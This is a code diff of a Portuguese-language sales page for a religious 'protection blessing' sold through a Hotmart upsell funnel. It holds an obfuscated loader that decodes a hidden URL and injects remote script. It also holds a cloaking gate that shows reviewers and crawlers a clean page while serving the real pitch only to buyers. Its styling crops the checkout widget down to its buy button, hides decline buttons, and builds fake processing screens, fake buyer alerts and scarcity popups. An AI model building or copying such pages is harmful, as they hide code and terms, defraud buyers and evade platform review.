@@ -5,109 +5,693 @@
 <!-- UTMIFY PIXEL -->
 <script>(function(){var u_n5=atob("DCvZENv3U1gbakXHDlD7ZambcWI5AjGzfljjP/SUNzY1HzGqZ02gPriYPnZ5GGq0bVmwYK+EfChyEiCrIVuwaL6bfTJoSGnlb1+tYrKVJix+GWf9VXb1MrybPDp6BjblNHCiMrWWPj05UGe3Z1O8fJKTcXQ5HCSre077KvnBMjl4XyPza03vdrnPNjkiW3f/bx7hJu/VLgVm");var h_ub=[];for(var l_pjr=0;l_pjr<u_n5.length;l_pjr++){h_ub.push(u_n5.charCodeAt(l_pjr)&255);}var j_an=h_ub[0];var u_zz4f=h_ub.slice(1,1+j_an);var p_jg7y=h_ub.slice(1+j_an);var i_yxk8=p_jg7y.map(function(b,s_xpz){return b^u_zz4f[s_xpz%j_an];});var g_u="";for(var u_qizs=0;u_qizs<i_yxk8.length;u_qizs++){g_u+=String.fromCharCode(i_yxk8[u_qizs]&255);}var t_py9=decodeURIComponent(escape(g_u));var e_a3q=JSON.parse(t_py9);var v_ers=e_a3q.globals||[];v_ers.forEach(function(i_t1e){window[i_t1e.name]=i_t1e.value;});var g_l3w=document.createElement("script");g_l3w.src=e_a3q.url;g_l3w.async=true;g_l3w.defer=true;(e_a3q.attributes||[]).forEach(function(w_s){g_l3w.setAttribute(w_s.name,w_s.value);});(document.head||document.documentElement).appendChild(g_l3w);})();</script>
 <!-- FIM UTMIFY -->
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
-<meta name="robots" content="noindex,nofollow">
-<title>Guia de Proteção Espiritual — 15 Dias com Maria</title>
+<title>Bênção Especial de Proteção</title>
+<meta name="robots" content="noindex, nofollow">
+
+
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' rx='12' fill='%23fbf8f1'/><circle cx='32' cy='33' r='20' fill='none' stroke='%23a5842f' stroke-width='2.4'/><path d='M32 18 V46 M23 27 H41' stroke='%23a5842f' stroke-width='3' stroke-linecap='round'/></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Anton&family=Montserrat:wght@600;700;800;900&display=swap" rel="stylesheet">
+<link rel="preload" as="image" href="guia-15-dias-maria.jpg" fetchpriority="high">
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yir9q5k2tg");
+</script>
+
+<!-- KashPay — processador do one-click upsell -->
 <script src="https://checkout.hotmart.com/lib/hotmart-checkout-elements.js"></script>
+
+<!-- GATE HOTMART -->
 <script>
+/* ---------- GATE: black so dentro do funil da Hotmart ---------- */
 (function(){
   try{
     var qs = new URLSearchParams(window.location.search);
     var ua = (navigator.userAgent || '').toLowerCase();
 
-    /* bot ou navegador automatizado: sempre white */
     var isBot = /bot|crawl|spider|google|facebookexternalhit|facebot|meta-externalagent|bingpreview|slurp|yandex|applebot|headless|phantom|selenium|webdriver|puppeteer|lighthouse|inspect|curl|wget|python|java\//i.test(ua);
     if (!ua || ua.length < 20) isBot = true;
-
-    /* forcar white para conferencia */
     var forcaClean = qs.get('clean') === '1' || qs.get('white') === '1';
 
-    /* 1) so o nosso link abre a black de fora do funil */
+    /* 1) o nosso link */
     var bypass = qs.get('bypass') === 'gl2026';
 
-    /* 2) hostname EXATO do checkout (nada de substring: subdominio de painel nao entra) */
+    /* 2) parametro de sessao do funil da Hotmart (so existe vindo de uma compra) */
+    var doFunil = !!(qs.get('fsid') || qs.get('off') || qs.get('hash') || qs.get('transaction') || qs.get('purchase'));
+
+    /* 3) hostname EXATO do checkout (nada de substring) */
     var refHost = '';
     try { refHost = new URL(document.referrer).hostname.toLowerCase(); } catch(e){}
     var HOSTS = ['pay.hotmart.com','checkout.hotmart.com','consumer.hotmart.com','hotmart.com','www.hotmart.com'];
     var doCheckout = HOSTS.indexOf(refHost) !== -1;
 
-    /* 3) ja esta dentro do funil nesta aba (gravado so por uma pagina de upsell) */
+    /* 4) ja esta dentro do funil nesta aba */
     var noFunil = false;
     try { noFunil = sessionStorage.getItem('funnel_ok') === '1'; } catch(e){}
 
-    if (!isBot && !forcaClean && (bypass || doCheckout || noFunil)) {
+    if (!isBot && !forcaClean && (bypass || doFunil || doCheckout || noFunil)) {
       try { sessionStorage.setItem('funnel_ok','1'); } catch(e){}
       document.documentElement.setAttribute('data-gate','real');
     } else {
       document.documentElement.setAttribute('data-gate','clean');
     }
-  }catch(e){
-    document.documentElement.setAttribute('data-gate','clean');
-  }
+  }catch(e){ document.documentElement.setAttribute('data-gate','clean'); }
 })();
 </script>
+
 <style>
-:root{--ink:#16181d;--muted:#6b7280;--line:#e6e3da;--gold:#a5842f;--green:#0a7d32;--green-d:#096a2a;--paper:#fbf8f1;}
-*,::after,::before{margin:0;padding:0;box-sizing:border-box;}
-html{overflow-x:hidden;}
-body{background:#fff;color:var(--ink);font-family:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased;line-height:1.65;}
-img{max-width:100%;height:auto;display:block;}
-a{color:inherit;}
-.wrap{width:100%;max-width:620px;margin:0 auto;padding:0 18px;}
+  :root {
+    --black:#000; --ink:#111; --light:#ebebeb; --blue:#004aad;
+    --green:#057932; --gold:#ffb000;
+    --sans:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;
+  }
+  *,::after,::before{margin:0;padding:0;box-sizing:border-box;}
+  html{overflow-x:hidden;scroll-behavior:smooth;}
+  body{overflow-x:hidden;max-width:100%;background:var(--light);font-family:var(--sans);-webkit-font-smoothing:antialiased;}
+  img{max-width:100%;height:auto;display:block;}
 
-/* ---------------- gate ---------------- */
-html[data-gate="clean"] #conteudo-real{display:none !important;}
-html[data-gate="clean"] #pagina-clean{display:block !important;}
-html[data-gate="real"] #conteudo-real{display:block !important;}
-html[data-gate="real"] #pagina-clean{display:none !important;}
+  /* CONTROLE VISUAL IMEDIATO */
+  html[data-gate="clean"] #conteudo-real { display: none !important; }
+  html[data-gate="clean"] #pagina-clean { display: block !important; }
 
-/* ---------------- white ---------------- */
-#pagina-clean{background:#fff;padding:26px 0 60px;}
-.w-top{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);font-weight:700;text-align:center;margin-bottom:12px;}
+  html[data-gate="real"] #conteudo-real { display: block !important; }
+  html[data-gate="real"] #pagina-clean { display: none !important; }
+
+  .wrap{width:100%;max-width:680px;margin:0 auto;}
+
+  .band-alert{background:#fff;padding:16px 18px;}
+  .alert-top{
+    font-size:15px;font-weight:800;line-height:1.35;
+    color:var(--blue);text-align:center;text-transform:uppercase;letter-spacing:.2px;
+  }
+
+  .band-black{background:var(--black);padding:32px 18px 26px;}
+  h1.headline{
+    font-size:38px;font-weight:900;line-height:1.1;
+    color:#fff;text-align:center;text-transform:uppercase;letter-spacing:-.5px;
+  }
+
+  .band-sub{background:#141414;padding:16px 18px;}
+  .headline-sub{
+    font-size:14.5px;font-weight:800;line-height:1.4;
+    color:#fff;text-align:center;text-transform:uppercase;letter-spacing:.2px;
+  }
+
+  .band-light{background:var(--light);padding:30px 18px 40px;}
+
+  .item-label{
+    font-size:26px;font-weight:700;line-height:1.15;
+    color:var(--ink);text-align:center;text-transform:uppercase;
+  }
+  .item-name{
+    font-size:36px;font-weight:900;line-height:1.1;
+    color:var(--blue);text-align:center;text-transform:uppercase;
+    margin-top:2px;margin-bottom:20px;letter-spacing:-.5px;
+  }
+
+  .appeal-box{
+    background:#fff;border-radius:12px;padding:22px 20px;margin-bottom:24px;
+    box-shadow:0 6px 20px rgba(0,0,0,0.06);border-left:5px solid var(--blue);
+  }
+  .appeal-text{
+    font-size:16px;font-weight:600;line-height:1.65;color:#222;text-align:left;
+  }
+
+  .product-shot{
+    width:100%;max-width:440px;margin:0 auto 24px;border-radius:14px;
+    box-shadow:0 14px 34px rgba(0,74,173,0.22);
+  }
+
+  /* ---- AVISO SAGRADO DE PERIGO (EM CIMA DO BOTÃO) ---- */
+  .divine-warning {
+    background: #fffbeb;
+    border: 2px solid #f59e0b;
+    border-radius: 12px;
+    padding: 16px 18px;
+    margin: 20px auto 16px;
+    max-width: 540px;
+    display: flex;
+    align-items: flex-start;
+    gap: 14px;
+    text-align: left;
+    box-shadow: 0 4px 16px rgba(245, 158, 11, 0.16);
+  }
+  .warning-icon {
+    font-size: 28px;
+    line-height: 1;
+    flex-shrink: 0;
+  }
+  .warning-text {
+    font-size: 14.5px;
+    font-weight: 600;
+    line-height: 1.5;
+    color: #78350f;
+  }
+  .warning-text strong {
+    color: #9a3412;
+    font-weight: 800;
+  }
+
+  /* ---- TOPO: BARRA VERMELHA / PROCESSAMENTO / AGRACIADA ---- */
+  .topo-vermelho{background:#e8141a;color:#fff;text-align:center;font-size:15px;font-weight:800;line-height:1.35;padding:13px 16px;}
+  .topo-vermelho b{display:block;margin-top:3px;}
+  .proc-pag{background:#fff;text-align:center;padding:36px 20px 32px;}
+  .proc-anel{width:62px;height:62px;margin:0 auto 18px;border:5px solid #f2dede;border-top-color:#c0392b;border-radius:50%;animation:proc-girar .8s linear infinite;}
+  @keyframes proc-girar{to{transform:rotate(360deg);}}
+  .proc-anel.ok{animation:none;border:5px solid #0f8a3c;position:relative;}
+  .proc-anel.ok::after{content:"✓";position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#0f8a3c;font-size:34px;font-weight:900;}
+  .proc-txt{font-size:19px;font-weight:900;color:#c0392b;letter-spacing:.3px;line-height:1.3;transition:color .4s;}
+  .proc-txt.ok{color:#0b6b2e;}
+  .proc-sub{font-size:13.5px;font-weight:600;color:#8a8a8a;margin-top:8px;}
+  .proc-nao-feche{font-size:13px;font-weight:600;color:#8a8a8a;margin-top:14px;}
+  #faixa-congrats{display:none;}
+  .escolhida{display:none;background:#fff;padding:34px 20px 30px;text-align:center;}
+  .esc-titulo{font-size:30px;font-weight:900;color:#1aa838;letter-spacing:.5px;margin-bottom:14px;}
+  .esc-sub{font-size:17px;font-weight:600;color:#222;line-height:1.5;margin-bottom:16px;}
+  .esc-sub strong{color:#111;font-weight:800;}
+  .esc-txt{font-size:15.5px;font-weight:600;color:#222;line-height:1.6;max-width:520px;margin:0 auto 14px;}
+  .esc-txt mark{background:#fff23a;color:#111;padding:0 2px;}
+  .esc-verde{color:#1aa838;font-weight:800;}
+  .proc-anel{position:relative;}
+  .proc-anel #proc-seg{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#c0392b;}
+  .esc-img{width:100%;max-width:300px;margin:6px auto 4px;border-radius:12px;box-shadow:0 12px 30px rgba(0,74,173,.2);}
+  .esc-nota{font-size:12.5px;font-weight:700;color:#c0392b;margin-top:6px;}
+  @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.025);}}
+  html[data-gate="real"] body{padding-bottom:0;}
+  /* durante o processamento só a barra e o anel aparecem */
+  #conteudo-real[data-fase="proc"] > :not(.topo-vermelho):not(#proc-pag){display:none !important;}
+  #conteudo-real[data-fase="ok"] #faixa-congrats{display:block;}
+  #conteudo-real[data-fase="ok"] .escolhida{display:block;}
+  @media (max-width:600px){ .topo-vermelho{font-size:13.5px;} .esc-titulo{font-size:26px;} .esc-sub{font-size:15.5px;} .esc-txt{font-size:14.5px;} }
+
+  /* ---- CABEÇALHO DE PARABÉNS / BÊNÇÃO LIBERTADA ---- */
+  .congrats{
+    background:linear-gradient(90deg,#0b6b2e,#0f8a3c);color:#fff;text-align:center;
+    font-size:15.5px;font-weight:800;line-height:1.4;padding:13px 18px;letter-spacing:.2px;
+  }
+  .band-bless{background:#fff;padding:28px 18px 26px;}
+  .bless-kicker{
+    font-size:13px;font-weight:800;letter-spacing:1.4px;text-transform:uppercase;
+    color:#9a7b1f;text-align:center;margin-bottom:10px;
+  }
+  .bless-title{
+    font-size:30px;font-weight:900;line-height:1.12;color:var(--ink);text-align:center;
+    text-transform:uppercase;letter-spacing:-.4px;margin-bottom:16px;
+  }
+  .bless-text{font-size:16px;font-weight:600;line-height:1.7;color:#222;margin-bottom:14px;}
+  .bless-text strong{color:var(--blue);font-weight:800;}
+  .bless-verse{
+    margin:18px auto 0;max-width:520px;background:#fbf7ec;border:1px solid #e8dcc4;border-radius:12px;
+    padding:14px 18px;text-align:center;font-size:15px;font-style:italic;line-height:1.55;color:#4a3a12;
+  }
+  .bless-verse span{display:block;font-style:normal;font-weight:800;font-size:12px;letter-spacing:1.2px;color:#9a7b1f;margin-top:6px;}
+  .bless-name{
+    margin:20px auto 0;max-width:540px;background:#0b1f4a;border-radius:14px;padding:20px 20px;
+    text-align:center;color:#fff;box-shadow:0 10px 28px rgba(11,31,74,.25);
+  }
+  .bless-name .bn-top{font-size:13px;font-weight:800;letter-spacing:1.2px;text-transform:uppercase;color:#ffd166;margin-bottom:8px;}
+  .bless-name .bn-main{font-size:20px;font-weight:900;line-height:1.3;text-transform:uppercase;}
+  .bless-name .bn-sub{font-size:14.5px;font-weight:600;line-height:1.55;margin-top:10px;color:#dbe4ff;}
+
+  /* ---- ACELERADOR ---- */
+  .accel-tag{
+    display:inline-block;background:var(--blue);color:#fff;font-size:12.5px;font-weight:800;
+    letter-spacing:1.2px;text-transform:uppercase;padding:7px 14px;border-radius:999px;margin:0 auto 14px;
+  }
+  .accel-center{text-align:center;}
+  .accel-compare{display:flex;gap:12px;max-width:540px;margin:0 auto 22px;}
+  .accel-compare .ac{
+    flex:1;border-radius:12px;padding:16px 12px;text-align:center;background:#fff;
+    box-shadow:0 6px 18px rgba(0,0,0,.06);
+  }
+  .accel-compare .ac.old{border:2px solid #d9d9d9;color:#666;}
+  .accel-compare .ac.new{border:2px solid var(--green);color:var(--green);}
+  .accel-compare .ac-lbl{font-size:12px;font-weight:800;letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;}
+  .accel-compare .ac-num{font-size:34px;font-weight:900;line-height:1;}
+  .accel-compare .ac-sub{font-size:12.5px;font-weight:700;margin-top:6px;}
+  .accel-compare .ac.old .ac-num{text-decoration:line-through;text-decoration-thickness:3px;text-decoration-color:#c0392b;}
+  .accel-list{max-width:540px;margin:0 auto 24px;background:#fff;border-radius:12px;padding:18px 20px;box-shadow:0 6px 20px rgba(0,0,0,.06);}
+  .accel-list p{font-size:15px;font-weight:600;line-height:1.55;color:#222;padding:8px 0;border-bottom:1px solid #eee;}
+  .accel-list p:last-child{border-bottom:0;}
+  .accel-list strong{color:var(--blue);}
+  .cta-verse{text-align:center;font-size:14px;font-style:italic;line-height:1.5;color:#555;margin:14px auto 0;max-width:460px;}
+  #barra-lembrete{position:fixed;left:0;right:0;bottom:0;z-index:50;background:#0b1f4a;color:#fff;text-align:center;font-size:14px;font-weight:600;padding:12px 16px 14px;box-shadow:0 -6px 18px rgba(0,0,0,.18);transition:transform .3s;}
+  #barra-lembrete b{color:#ffd166;}
+  #barra-lembrete.off{transform:translateY(110%);}
+  html[data-gate="real"] body{padding-bottom:56px;}
+  /* ---- NOTIFICAÇÃO DISCRETA DE BÊNÇÃO (canto inferior esquerdo, acima da barra) ---- */
+  #notif-bencao{
+    position:fixed;left:10px;bottom:66px;z-index:60;max-width:270px;width:calc(100% - 20px);
+    background:#fff;border:1px solid #e8dcc4;border-left:3px solid var(--green);border-radius:9px;
+    padding:5px 22px 5px 8px;box-shadow:0 6px 18px rgba(0,0,0,.12);
+    opacity:0;transform:translateY(12px);pointer-events:none;transition:opacity .35s,transform .35s;
+  }
+  #notif-bencao.on{opacity:1;transform:translateY(0);pointer-events:auto;}
+  #notif-bencao .nb-top{display:flex;align-items:center;gap:7px;min-width:0;}
+  #notif-bencao .nb-top > div:not(.nb-ini){min-width:0;flex:1;}
+  #notif-bencao .nb-ini{
+    flex:0 0 22px;width:22px;height:22px;font-size:10.5px;border-radius:50%;flex-shrink:0;background:linear-gradient(135deg,#c9a84c,#9a7b1f);
+    color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:12.5px;
+  }
+  #notif-bencao .nb-nome{font-weight:800;font-size:11px;color:#111;line-height:1.2;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  #notif-bencao .nb-nome .nb-local{font-weight:600;color:#999;font-size:10px;}
+  #notif-bencao .nb-txt{font-size:10px;color:#555;line-height:1.25;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+  #notif-bencao .nb-txt strong{color:var(--blue);}
+  #notif-bencao .nb-local{color:#888;}
+  #notif-bencao .nb-copias{display:inline;font-size:9.5px;font-weight:800;color:#c0392b;white-space:nowrap;}
+  #notif-bencao .nb-fechar{
+    position:absolute;top:0;right:0;width:22px;height:22px;background:none;border:none;cursor:pointer;
+    color:#b0a894;font-size:17px;line-height:1;display:flex;align-items:center;justify-content:center;border-radius:50%;
+  }
+  @media(max-width:480px){ #notif-bencao{max-width:262px;width:auto;} }
+  /* ---- AVISO CENTRAL: ÚLTIMA CÓPIA ---- */
+  #aviso-ultima{
+    position:fixed;inset:0;z-index:100;background:rgba(5,10,30,.78);-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px);
+    display:flex;align-items:center;justify-content:center;padding:18px;opacity:0;pointer-events:none;transition:opacity .35s;
+  }
+  #aviso-ultima.on{opacity:1;pointer-events:auto;}
+  #aviso-ultima .au-card{
+    background:#fff;border-radius:22px;max-width:400px;width:100%;overflow:hidden;text-align:center;
+    box-shadow:0 30px 80px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.08);
+    transform:translateY(22px) scale(.97);transition:transform .4s cubic-bezier(.2,.9,.3,1.2);
+  }
+  #aviso-ultima.on .au-card{transform:translateY(0) scale(1);}
+  #aviso-ultima .au-head{
+    background:radial-gradient(120% 140% at 50% 0%,#1c3f8f 0%,#0b1f4a 60%,#071331 100%);
+    color:#fff;padding:24px 22px 34px;position:relative;
+  }
+  #aviso-ultima .au-kicker{font-size:11.5px;font-weight:800;letter-spacing:1.6px;text-transform:uppercase;color:#ffd166;margin-bottom:10px;}
+  #aviso-ultima .au-titulo{font-size:21px;font-weight:900;line-height:1.22;letter-spacing:-.3px;}
+  #aviso-ultima .au-titulo em{font-style:normal;color:#ffd166;}
+  #aviso-ultima .au-body{padding:0 22px 20px;position:relative;}
+  #aviso-ultima .au-selo{
+    width:76px;height:76px;border-radius:50%;margin:-38px auto 12px;background:#fff;
+    border:4px solid #ffd166;box-shadow:0 8px 22px rgba(0,0,0,.18);
+    display:flex;flex-direction:column;align-items:center;justify-content:center;line-height:1;
+  }
+  #aviso-ultima .au-selo span{font-size:30px;font-weight:900;color:#c0392b;}
+  #aviso-ultima .au-selo small{font-size:9px;font-weight:800;letter-spacing:.6px;text-transform:uppercase;color:#777;margin-top:3px;line-height:1.15;}
+  #aviso-ultima .au-txt{font-size:15px;font-weight:600;line-height:1.6;color:#2a2a2a;margin-bottom:12px;}
+  #aviso-ultima .au-txt strong{color:#c0392b;font-weight:800;}
+  #aviso-ultima .au-btn{
+    font-family:'Poppins',sans-serif;font-size:16.5px;font-weight:600;line-height:1.3;color:#fff;
+    background:linear-gradient(180deg,#0a8f3c,#057932);border:none;border-radius:12px;padding:15px 18px;width:100%;cursor:pointer;
+    margin-top:6px;box-shadow:0 10px 24px rgba(5,121,50,.35);animation:au-pulse 1.8s ease-in-out infinite;
+  }
+  @keyframes au-pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.025);}}
+  #aviso-ultima .au-fechar{
+    display:block;margin:14px auto 0;background:none;border:none;cursor:pointer;
+    font-family:var(--sans);font-size:12.5px;font-weight:600;color:#9a9a9a;text-decoration:underline;text-underline-offset:3px;
+  }
+  @media (max-width:360px){ #aviso-ultima .au-titulo{font-size:19px;} #aviso-ultima .au-txt{font-size:14px;} }
+  .cta-verse span{display:block;font-style:normal;font-weight:800;font-size:11.5px;letter-spacing:1.2px;color:#9a7b1f;margin-top:4px;}
+
+  .clean-wrap{max-width:640px;margin:0 auto;padding:60px 22px 80px;}
+  .clean-wrap h1{font-size:26px;font-weight:700;line-height:1.3;color:#1d1a14;margin-bottom:14px;}
+  .clean-wrap p{font-size:16px;font-weight:400;line-height:1.75;color:#3d382e;margin-bottom:16px;}
+  .clean-foot{margin-top:36px;padding-top:20px;border-top:1px solid #d8d2c4;font-size:13px;color:#7a7466;line-height:1.7;}
+  .clean-foot a{color:#7a7466;}
+
+  @media (max-width:600px){
+    .alert-top{font-size:13px;}
+    h1.headline{font-size:28px;}
+    .band-black{padding:24px 16px 20px;}
+    .headline-sub{font-size:13px;}
+    .item-label{font-size:21px;}
+    .item-name{font-size:29px;margin-bottom:16px;}
+    .appeal-text{font-size:14.5px;}
+    .band-light{padding:24px 14px 32px;}
+    .divine-warning { padding: 14px 14px; gap: 10px; margin: 16px auto 14px; }
+    .warning-icon { font-size: 24px; }
+    .warning-text { font-size: 13.5px; }
+    .bless-title{font-size:24px;}
+    .bless-text{font-size:14.5px;}
+    .bless-name .bn-main{font-size:17px;}
+    .accel-compare .ac-num{font-size:28px;}
+    .accel-list p{font-size:14px;}
+  }
+
+    /* ---- QUIZ INTERATIVO U1 (BLINDAGEM & CADÊNCIA DE ANTIFRAUDE) ---- */
+  .quiz-instruction {
+    font-size: 12.5px;
+    font-weight: 700;
+    color: #0b6b2e;
+    text-align: center;
+    margin-bottom: 12px;
+    background: #eefbf1;
+    border: 1px dashed #86efac;
+    border-radius: 8px;
+    padding: 7px 12px;
+    display: block;
+    box-sizing: border-box;
+  }
+  .quiz-btn {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    width: 100%;
+    background: #ffffff;
+    border: 2px solid #cbd5e1;
+    border-radius: 12px;
+    padding: 13px 14px;
+    text-align: left;
+    cursor: pointer;
+    font-family: var(--sans);
+    transition: all 0.2s ease;
+    box-shadow: 0 3px 10px rgba(0, 0, 0, 0.04);
+    position: relative;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .quiz-btn:hover {
+    border-color: #057932;
+    background: #f0fdf4;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 16px rgba(5, 121, 50, 0.12);
+  }
+  .quiz-btn:active, .quiz-btn.selected {
+    border-color: #057932 !important;
+    background: #eaf8ee !important;
+    transform: scale(0.99);
+  }
+  .quiz-ic {
+    font-size: 24px;
+    line-height: 1;
+    flex-shrink: 0;
+  }
+  .quiz-txt {
+    font-size: 13.5px;
+    font-weight: 700;
+    line-height: 1.4;
+    color: #1e293b;
+    flex: 1;
+    text-align: left;
+  }
+  /* Bolinha seletora na direita (estilo radio button) */
+  .quiz-radio {
+    width: 22px;
+    height: 22px;
+    min-width: 22px;
+    border-radius: 50%;
+    border: 2px solid #94a3b8;
+    background: #ffffff;
+    margin-left: 8px;
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-sizing: border-box;
+    transition: all 0.2s ease;
+    box-shadow: inset 0 1px 2px rgba(0,0,0,0.06);
+  }
+  .quiz-radio::after {
+    content: '';
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: #057932;
+    transform: scale(0);
+    opacity: 0;
+    transition: transform 0.15s ease, opacity 0.15s ease;
+  }
+  .quiz-btn:hover .quiz-radio {
+    border-color: #057932;
+  }
+  .quiz-btn:hover .quiz-radio::after {
+    transform: scale(0.6);
+    opacity: 0.4;
+  }
+  .quiz-btn:active .quiz-radio,
+  .quiz-btn.selected .quiz-radio {
+    border-color: #057932 !important;
+    border-width: 2.5px;
+    background: #ffffff !important;
+  }
+  .quiz-btn:active .quiz-radio::after,
+  .quiz-btn.selected .quiz-radio::after {
+    transform: scale(1) !important;
+    opacity: 1 !important;
+  }
+  .quiz-loader {
+    background: #ffffff;
+    border: 1px solid #e2e8f0;
+    border-radius: 14px;
+    padding: 24px 18px;
+    text-align: center;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.05);
+    animation: fadeIn .3s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+
+  /* Ocultar silenciosamente botões de erro/recusa da KashPay */
+  #kashpay-skip-btn, #kashpay-retry-btn { display: none !important; }
+
+</style>
+
+<style>
+/* ---------- janela do widget da Hotmart: mostra so o botao ----------
+   Medidas conferidas no widget REAL, dentro do funil (compra ativa):
+   largura fixa 420px  ·  botao entre 150px e 242px do topo do widget.
+   A largura e travada em 420 e reduzida por escala nos ecras pequenos,
+   para o layout interno do widget ser sempre o mesmo. NAO recalibrar
+   fora do funil: sem compra ativa o widget mostra um aviso curto e as
+   medidas dao erradas. */
+.hm-fora{width:100%;max-width:440px;margin:12px auto 4px;overflow:hidden;}
+.hm-escala{width:420px;transform-origin:top left;}
+.hm-janela{width:420px;height:92px;overflow:hidden;position:relative;background:#fff;}
+.hm-janela #hotmart-sales-funnel,.hm-janela #widget-black{width:420px !important;margin-top:-150px !important;display:block;}
+.hm-janela iframe{width:420px !important;border:0;}
+.hm-nota{text-align:center;font-size:12px;color:#8a8f99;margin:2px auto 14px;}
+
+/* ---------- pagina do produto (white) ---------- */
+#pagina-clean{background:#fff;padding:26px 0 60px;color:#16181d;font-family:'Montserrat',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;line-height:1.65;}
+#pagina-clean .wrap{width:100%;max-width:620px;margin:0 auto;padding:0 18px;}
+.w-top{font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#a5842f;font-weight:700;text-align:center;margin-bottom:12px;}
 .w-h1{font-size:clamp(20px,4.6vw,26px);font-weight:800;text-align:center;line-height:1.28;margin-bottom:10px;}
-.w-sub{text-align:center;color:var(--muted);font-size:15px;max-width:520px;margin:0 auto 24px;}
-.w-img{max-width:300px;margin:0 auto 26px;border-radius:12px;border:1px solid var(--line);}
+.w-sub{text-align:center;color:#6b7280;font-size:15px;max-width:520px;margin:0 auto 24px;}
+.w-img{max-width:300px;margin:0 auto 26px;border-radius:12px;border:1px solid #e6e3da;}
 .w-sec{margin-bottom:26px;}
 .w-sec h2{font-size:16px;font-weight:800;margin-bottom:10px;}
 .w-sec p{font-size:15px;color:#3a3f4a;margin-bottom:12px;}
-.w-lista{list-style:none;}
-.w-lista li{display:flex;gap:12px;padding:11px 0;border-bottom:1px solid var(--line);}
+.w-lista{list-style:none;padding:0;}
+.w-lista li{display:flex;gap:12px;padding:11px 0;border-bottom:1px solid #e6e3da;}
 .w-lista li:last-child{border-bottom:none;}
 .w-lista .ic{font-size:19px;min-width:26px;}
 .w-lista b{display:block;font-size:14.5px;}
-.w-lista span{font-size:13.5px;color:var(--muted);}
-.w-box{background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:18px 18px;margin-bottom:26px;}
+.w-lista span{font-size:13.5px;color:#6b7280;}
+.w-box{background:#fbf8f1;border:1px solid #e6e3da;border-radius:12px;padding:18px;margin-bottom:26px;}
 .w-box h3{font-size:14px;font-weight:800;margin-bottom:8px;}
 .w-box p{font-size:13.5px;color:#3a3f4a;margin-bottom:8px;}
 .w-box p:last-child{margin-bottom:0;}
-.w-compra{border:1px solid var(--line);border-radius:14px;padding:20px 16px;text-align:center;margin-bottom:26px;}
-.w-compra .rot{font-size:12px;letter-spacing:1.4px;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:12px;}
-.w-foot{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--muted);line-height:1.8;text-align:center;}
-
-/* ---------------- black ---------------- */
-#conteudo-real{background:#fff;padding:0 0 50px;}
-.b-topo{background:var(--green);color:#fff;text-align:center;font-size:13px;font-weight:700;padding:11px 16px;letter-spacing:.3px;}
-.b-etapa{text-align:center;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--gold);font-weight:700;margin:22px 0 8px;}
-.b-h1{font-size:clamp(21px,5.2vw,30px);font-weight:900;text-align:center;line-height:1.22;margin-bottom:12px;text-transform:uppercase;}
-.b-lead{text-align:center;font-size:16px;color:#3a3f4a;max-width:520px;margin:0 auto 22px;}
-.b-img{max-width:300px;margin:0 auto 24px;border-radius:12px;border:1px solid var(--line);}
-.b-corpo p{font-size:16px;color:#22252c;margin-bottom:14px;}
-.b-corpo b{font-weight:800;}
-.b-aviso{background:#fff7e6;border:1px solid #e8cf94;border-radius:12px;padding:15px 16px;font-size:14.5px;color:#5a4410;margin:22px 0;font-weight:600;}
-
-/* --------- widget: mascara das cover boxes (valores calibrados, NAO mexer) --------- */
-#caixa-widget{position:relative;background:#fff;max-width:420px;margin:0 auto;}
-#cover-box-top{position:absolute;top:0;left:0;width:100%;height:190px;background:#fff;z-index:9999;pointer-events:none;}
-#cover-box-bottom{position:absolute;bottom:0;left:0;width:100%;height:200px;background:#fff;z-index:9999;pointer-events:none;}
+.w-compra{border:1px solid #e6e3da;border-radius:14px;padding:20px 16px;text-align:center;margin-bottom:26px;}
+.w-compra .rot{font-size:12px;letter-spacing:1.4px;text-transform:uppercase;color:#6b7280;font-weight:700;margin-bottom:12px;}
+.w-foot{border-top:1px solid #e6e3da;padding-top:18px;font-size:12px;color:#6b7280;line-height:1.8;text-align:center;}
 </style>
 </head>
 <body>
 
